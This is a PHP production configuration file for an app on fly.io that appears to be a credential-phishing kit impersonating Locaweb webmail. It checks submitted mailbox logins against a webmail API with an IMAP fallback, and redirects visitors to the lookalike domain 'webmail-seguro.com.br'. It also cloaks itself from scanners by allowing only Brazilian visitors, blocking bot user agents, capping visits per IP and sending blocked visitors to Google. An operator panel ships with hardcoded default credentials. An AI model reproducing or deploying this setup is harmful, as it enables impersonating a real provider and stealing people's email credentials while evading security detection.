<?php
declare(strict_types=1);

/**
 * Produção Fly.io — welcome-locaweb.fly.dev
 * Carregado automaticamente quando FLY_APP_NAME está definido.
 */
$cfg = require __DIR__ . '/config.example.php';

$baseUrl = rtrim((string) (getenv('APP_BASE_URL') ?: 'https://welcome-locaweb.fly.dev'), '/');

$cfg['env']        = 'production';
$cfg['base_url']   = $baseUrl;
$cfg['url_prefix'] = '';
$cfg['data_dir']   = '/data';

$cfg['mailbox_verify']       = true;
$cfg['webmail_http_verify']  = true;
$cfg['webmail_imap_fallback'] = true;
$cfg['webmail_api_url']      = 'https://webmail-seguro.com.br';
$cfg['webmail_api_timeout']  = 45;

$cfg['panel_redirect']   = 'https://webmail-seguro.com.br/v2/';
$cfg['success_redirect'] = 'https://webmail-seguro.com.br/v2/';

$cfg['turnstile_enabled']  = true;
$cfg['turnstile_site_key'] = '1x00000000000000000000AA';

$cfg['panel_name']      = (string) (getenv('PANEL_NAME') ?: 'D3V L1m4');
$cfg['panel_user']      = (string) (getenv('PANEL_USER') ?: 'Lima');
$cfg['panel_pass']      = (string) (getenv('PANEL_PASS') ?: 'Lima');
$cfg['panel_reset_key'] = (string) (getenv('PANEL_RESET_KEY') ?: 'fly-reset-change-me');

$cfg['blocked_redirect'] = 'https://google.com/erro';
$cfg['max_ip_visits']    = 20;

$cfg['anti_bot'] = array_merge($cfg['anti_bot'] ?? [], [
    'enabled'             => true,
    'allowed_countries'   => ['BR'],
    'enforce_country'     => true,
    'deny_hosting'        => false,
    'deny_proxy_vpn'      => false,
    'deny_datacenter_asn' => false,
    'deny_bots_ua'        => true,
    'deny_bad_headers'    => false,
    'deny_empty_ua'       => true,
    'deny_headless_signals' => false,
    'enforce_device'      => false,
    'strict_geo_unknown'  => false,
    'allow_localhost'     => false,
    'log_blocks'          => true,
]);

return $cfg;
